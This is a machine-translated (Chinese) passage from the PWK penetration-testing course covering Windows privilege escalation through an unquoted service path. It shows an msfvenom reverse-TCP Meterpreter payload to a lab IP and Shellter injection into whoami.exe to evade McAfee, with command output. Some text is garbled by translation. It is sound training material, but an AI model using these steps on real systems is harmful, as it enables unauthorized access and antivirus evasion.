
<!-- saved from url=(0051)https://translate.googleusercontent.com/translate_f -->
<html lang="zh-CN" class="translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="google" content="notranslate">
<script>(function(){/*

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/
(function(){function e(g){this.t={};this.tick=function(h,k,f){this.t[h]=[void 0!=f?f:(new Date).getTime(),k];if(void 0==f)try{window.console.timeStamp("CSI/"+h)}catch(m){}};this.getStartTickTime=function(){return this.t.start[0]};this.tick("start",null,g)}var a;if(window.performance)var d=(a=window.performance.timing)&&a.responseStart;var l=0<d?new e(d):new e;window.jstiming={Timer:e,load:l};if(a){var b=a.navigationStart;0<b&&d>=b&&(window.jstiming.srt=d-b)}if(a){var c=window.jstiming.load;0<b&&d>=
b&&(c.tick("_wtsrt",void 0,b),c.tick("wtsrt_","_wtsrt",d),c.tick("tbsd_","wtsrt_"))}try{a=null,window.chrome&&window.chrome.csi&&(a=Math.floor(window.chrome.csi().pageT),c&&0<b&&(c.tick("_tbnd",void 0,window.chrome.csi().startE),c.tick("tbnd_","_tbnd",b))),null==a&&window.gtbExternal&&(a=window.gtbExternal.pageT()),null==a&&window.external&&(a=window.external.pageT,c&&0<b&&(c.tick("_tbnd",void 0,window.external.startE),c.tick("tbnd_","_tbnd",b))),a&&(window.jstiming.pt=a)}catch(g){}})();}).call(window);
</script><script src="./o3cp[810-853]_files/translate_c.js.下载"></script><script>_intlStrings._originalText = "英语原文:";_intlStrings._interfaceDirection="ltr";_intlStrings._interfaceAlign="left";_intlStrings._langpair="en|zh-CN";_intlStrings._feedbackUrl="https://translate.google.com/translate_suggestion";_intlStrings._currentBy="当前的翻译是由%2$s在 %1$s完成的";_intlStrings._unknown="佚名译者";_intlStrings._suggestTranslation="更好的翻译建议"  ;_intlStrings._submit="贡献力量";_intlStrings._suggestThanks="感谢您为 Google 翻译提供翻译建议。";_intlStrings._reverse=false;_intlStrings._staticContentPath="https://www.gstatic.com/translate/infowindow/";</script><style type="text/css">.google-src-text {display: none !important} .google-src-active-text {display: block!important;color:black!important; font-size:12px!important;font-family:arial,sans-serif!important}.google-src-active-text a {font-size:12px!important}.google-src-active-text a:link {color:#00c!important;text-decoration:underline!important}.google-src-active-text a:visited {color:purple!important;text-decoration:underline!important}.google-src-active-text a:active {color:red!important;text-decoration:underline!important}</style><meta http-equiv="X-Translated-By" content="Google"><link href="https://translate.googleusercontent.com/o3cp[810-853].pdf" hreflang="en" rel="alternate machine-translated-from"><link href="./o3cp[810-853]_files/css" rel="stylesheet" type="text/css"><!--<base href="" target="_top">--><base href="." target="_top">

<title>现在我们可以打开服务并找到“Puppet Agent Service”。 Puppet 代理配置为通过“本地系统 h</title>
<style type="text/css" abt="234"></style><link type="text/css" rel="stylesheet" charset="UTF-8" href="./o3cp[810-853]_files/translateelement.css"><script type="text/javascript" charset="UTF-8" src="./o3cp[810-853]_files/main_zh-CN.js.下载"></script><script>//console.log('a')
</script><script>//remove baidu search ad
var _countAA = 0
function doBBBd(){}
doBBBd()
document.addEventListener('keyup', function(){_countAA-=10;doBBBd()}, false)
document.addEventListener('click', function(){_countAA-=10;doBBBd()}, false)

</script><script type="text/javascript" charset="UTF-8" src="./o3cp[810-853]_files/element_main.js.下载"></script><link rel="stylesheet" type="text/css" href="./o3cp[810-853]_files/iw_sprite.css"></head><body bgcolor="#ffffff" vlink="blue" link="blue">
        <style>
          .spinner-container {
            width:25%;
            top:20px;
            left:50%;
            margin-left:-12.5%;
            border-radius:8px;
            position:fixed;
            text-align:center;
            box-shadow:0 0 10px rgba(0,0,0,0.24);
            background:#fff;
            overflow:hidden;
          }

          .spinner-container p{
            font-family:'Roboto', Arial, sans-serif;
            color:rgba(0,0,0,0.87);
            margin:12px 0 16px 0;
            padding:0;
            font-size:12px;
          }

          .spinner-container img{
            width:22px;
            height:22px;
            margin:16px 0 0;
            padding:0;
          }
        </style>
        <div class="spinner-container notranslate" id="gt-dt-spinner" style="display: none;">
         <img src="./o3cp[810-853]_files/progress_spinner_color_20dp@2x.gif">
         <p>正在翻译...</p>
        </div>
      <iframe src="./o3cp[810-853]_files/translate_un.html" width="0" height="0" frameborder="0" style="width:0px;height:0px;border:0px;display:none;"></iframe>
<table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="1"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 1 页</font></font></b></a></font></td></tr></tbody></table><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:208;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:1285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:1285;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:1285;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">810</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.3.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们可以打开</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并找到“Puppet Agent Service”。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:899;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 346：在服务中查找 Puppet 代理</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Puppet 代理配置为通过“本地系统”运行。</font><font style="vertical-align: inherit;">这对我们来说是个好消息，因为我们可能</font></font></nobr></div>
<div style="position:absolute;top:949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有一条通往特权升级的道路。</font><font style="vertical-align: inherit;">此时，下一步就是检查C:\Puppet目录是否</font></font></nobr></div>
<div style="position:absolute;top:969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是可写的，因为这是我们利用未引用的服务路径的要求。</font><font style="vertical-align: inherit;">我们可以看到</font></font></nobr></div>
<div style="position:absolute;top:988;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">icacls</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拥有什么权限</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:1023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\alex&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">icacls "C:\Puppet"</font></font></font></b></nobr></div>
<div style="position:absolute;top:1040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Puppet </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BUILTIN\Users:(W)</font></font></font></b></nobr></div>
<div style="position:absolute;top:1057;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内置\管理员：(I)(F)</font></font></nobr></div>
<div style="position:absolute;top:1074;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内置\管理员：(I)(OI)(CI)(IO)(F)</font></font></nobr></div>
<div style="position:absolute;top:1091;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\SYSTEM:(I)(F)</font></font></nobr></div>
<div style="position:absolute;top:1108;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)</font></font></nobr></div>
<div style="position:absolute;top:1125;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内置\用户：(I)(OI)(CI)(RX)</font></font></nobr></div>
<div style="position:absolute;top:1142;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\Authenticated Users:(I)(M)</font></font></nobr></div>
<div style="position:absolute;top:1159;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)</font></font></nobr></div>
<div style="position:absolute;top:1178;left:308"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 969 - 检查 C: 目录的权限 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:1363;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="2"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第2页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:1396;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:2473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:2473;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:2473;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">811</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据清单 969，我们对 C:\Puppet 文件夹具有写访问权限，因为 alex 是</font></font></nobr></div>
<div style="position:absolute;top:1511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组。</font><font style="vertical-align: inherit;">接下来，为了利用未引用的路径 C:\Puppet\Current Version，我们需要</font></font></nobr></div>
<div style="position:absolute;top:1530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建一个名为 Current.exe 的反向外壳，可以逃避防病毒并将其放置在 C:\Puppet 中。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:1565;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.4</font></font></i></nobr></div>
<div style="position:absolute;top:1565;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未加引号的搜索路径利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们知道防病毒软件正在运行，因此我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellter</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将一个</font><i><font style="vertical-align: inherit;">Meterpreter</font></i><font style="vertical-align: inherit;">负载注入到</font></font></nobr></div>
<div style="position:absolute;top:1622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 二进制文件有望绕过 McAfee。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:1684;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确保 shellter 在 Kali 上与 Wine 一起安装。</font><font style="vertical-align: inherit;">说明可以找到</font></font></i></nobr></div>
<div style="position:absolute;top:1704;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果需要，在 AV Evasion 模块中</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将创建一个名为家禽的目录来处理并复制合法的 Windows 二进制文件</font></font></nobr></div>
<div style="position:absolute;top:1785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到它。</font><font style="vertical-align: inherit;">我们将选择的 windows 二进制文件是 whoami.exe，它被捕获的机会较低</font></font></nobr></div>
<div style="position:absolute;top:1804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AV 考虑到它是众所周知的合法实用程序。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:1839;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir 家禽</font></font></font></b></nobr></div>
<div style="position:absolute;top:1856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cp /usr/share/windows-resources/binaries/whoami.exe ./poultry/</font></font></font></b></nobr></div>
<div style="position:absolute;top:1873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd 家禽/</font></font></font></b></nobr></div>
<div style="position:absolute;top:1890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/家禽$ </font></font></nobr></div>
<div style="position:absolute;top:1910;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 970 - 复制 whoami 二进制文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复制二进制文件后，我们将生成一个用于 shellter 的 Meterpreter 有效负载。</font><font style="vertical-align: inherit;">我们将指定</font></font></nobr></div>
<div style="position:absolute;top:1958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个 Windows 反向 TCP Meterpreter 有效负载，以匹配我们的目标操作系统。</font><font style="vertical-align: inherit;">我们 Kali 的 IP</font></font></nobr></div>
<div style="position:absolute;top:1978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项中</font><font style="vertical-align: inherit;">指定</font><font style="vertical-align: inherit;">，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LPORT</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">选择端口 80 </font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">端口 80 是</font></font></nobr></div>
<div style="position:absolute;top:1997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择是为了规避任何潜在的出站防火墙限制。</font><font style="vertical-align: inherit;">接下来，我们将编码</font></font></nobr></div>
<div style="position:absolute;top:2016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">的二进制文件，</font><font style="vertical-align: inherit;">并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-i</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定任意数量的编码迭代</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">最后，</font></font></nobr></div>
<div style="position:absolute;top:2036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-f</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">以原始格式输出</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">此命令的输出将被重定向到</font></font></nobr></div>
<div style="position:absolute;top:2055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.bin 文件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/poultry$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:2107;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=80 -e x86/shikata_ga_nai -i 7 -f raw &gt; met.bin</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择平台，从有效负载中选择 Msf::Module::Platform::Windows</font></font></nobr></div>
<div style="position:absolute;top:2141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择 arch，从有效载荷中选择 arch: x86</font></font></nobr></div>
<div style="position:absolute;top:2158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到 1 个兼容的编码器</font></font></nobr></div>
<div style="position:absolute;top:2175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试使用 x86/shikata_ga_nai 的 7 次迭代对有效载荷进行编码</font></font></nobr></div>
<div style="position:absolute;top:2192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 368（迭代 = 0）</font></font></nobr></div>
<div style="position:absolute;top:2209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 395（迭代=1）</font></font></nobr></div>
<div style="position:absolute;top:2226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 422（迭代 = 2）</font></font></nobr></div>
<div style="position:absolute;top:2243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 449（迭代 = 3）</font></font></nobr></div>
<div style="position:absolute;top:2260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 476（迭代 = 4）</font></font></nobr></div>
<div style="position:absolute;top:2277;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 503（迭代 = 5）</font></font></nobr></div>
<div style="position:absolute;top:2294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 530（迭代 = 6）</font></font></nobr></div>
<div style="position:absolute;top:2311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 选择最终尺寸 530</font></font></nobr></div>
<div style="position:absolute;top:2327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷大小：530 字节</font></font></nobr></div>
<div style="position:absolute;top:2347;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 971 - 生成 meterpreter shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2376;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成有效载荷后，我们现在可以启动 shellter 将其动态注入 whoami.exe</font></font></nobr></div>
<div style="position:absolute;top:2396;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">二进制。</font><font style="vertical-align: inherit;">要启动 Shellter，我们将</font><font style="vertical-align: inherit;">在 Kali 的命令行中</font><font style="vertical-align: inherit;">输入</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellter</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">当我们第一次开始</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:2551;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="3"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 3 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:2584;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:3661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:3661;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:3661;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">812</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellter，它提示我们选择自动或手动操作模式。</font><font style="vertical-align: inherit;">我们将选择“A”作为</font></font></nobr></div>
<div style="position:absolute;top:2699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动模式，然后指定目标PE文件/home/kali/poultry/whoami.exe。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择操作模式 - 自动/手动 (A/M/H)：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A</font></font></font></b></nobr></div>
<div style="position:absolute;top:2768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PE目标：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/home/kali/poultry/whoami.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:2802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">**********</font></font></nobr></div>
<div style="position:absolute;top:2819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 备份 *</font></font></nobr></div>
<div style="position:absolute;top:2836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">**********</font></font></nobr></div>
<div style="position:absolute;top:2870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">备份：Shellter_Backups\whoami.exe</font></font></nobr></div>
<div style="position:absolute;top:2904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:2938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过滤时间大约：0.0024 分钟。</font></font></nobr></div>
<div style="position:absolute;top:2957;left:269"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 972 - 将 meterpreter shell 注入 whoami 二进制文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2986;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入二进制文件的完整路径后，shellter 会对该文件进行备份。</font><font style="vertical-align: inherit;">我们现在被提示</font></font></nobr></div>
<div style="position:absolute;top:3006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到“启用隐形模式”，我们将在这种情况下跳过，因为我们不需要</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">二进制文件</font></font></nobr></div>
<div style="position:absolute;top:3025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在执行我们的有效载荷后正常运行。</font><font style="vertical-align: inherit;">接下来，系统会提示我们选择有效负载。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:3060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用隐身模式？</font><font style="vertical-align: inherit;">(Y/N/H)：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">N</font></font></font></b></nobr></div>
<div style="position:absolute;top:3094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">************</font></font></nobr></div>
<div style="position:absolute;top:3111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 有效载荷 *</font></font></nobr></div>
<div style="position:absolute;top:3128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">************</font></font></nobr></div>
<div style="position:absolute;top:3162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[1] Meterpreter_Reverse_TCP [stager]</font></font></nobr></div>
<div style="position:absolute;top:3179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[2] Meterpreter_Reverse_HTTP [stager]</font></font></nobr></div>
<div style="position:absolute;top:3196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[3] Meterpreter_Reverse_HTTPS [stager]</font></font></nobr></div>
<div style="position:absolute;top:3213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[4] Meterpreter_Bind_TCP [stager]</font></font></nobr></div>
<div style="position:absolute;top:3230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[5] Shell_Reverse_TCP    </font></font></nobr></div>
<div style="position:absolute;top:3230;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[舞台演员]</font></font></nobr></div>
<div style="position:absolute;top:3247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[6] Shell_Bind_TCP    </font></font></nobr></div>
<div style="position:absolute;top:3247;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[舞台演员]</font></font></nobr></div>
<div style="position:absolute;top:3263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[7] WinExec</font></font></nobr></div>
<div style="position:absolute;top:3298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用列出的有效负载还是自定义？</font><font style="vertical-align: inherit;">(L/C/H): </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C</font></font></font></b></nobr></div>
<div style="position:absolute;top:3317;left:269"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 973 - 将 meterpreter shell 注入 whoami 二进制文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:3347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用我们通过 msfvenom 生成的自定义 (C) 负载。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:3381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择有效载荷：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/home/kali/poultry/met.bin</font></font></font></b></nobr></div>
<div style="position:absolute;top:3415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此有效负载是反射 DLL 加载程序吗？</font><font style="vertical-align: inherit;">(Y/N/H)：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">N</font></font></font></b></nobr></div>
<div style="position:absolute;top:3449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">****************</font></font></nobr></div>
<div style="position:absolute;top:3466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 有效载荷信息 *</font></font></nobr></div>
<div style="position:absolute;top:3483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">****************</font></font></nobr></div>
<div style="position:absolute;top:3500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
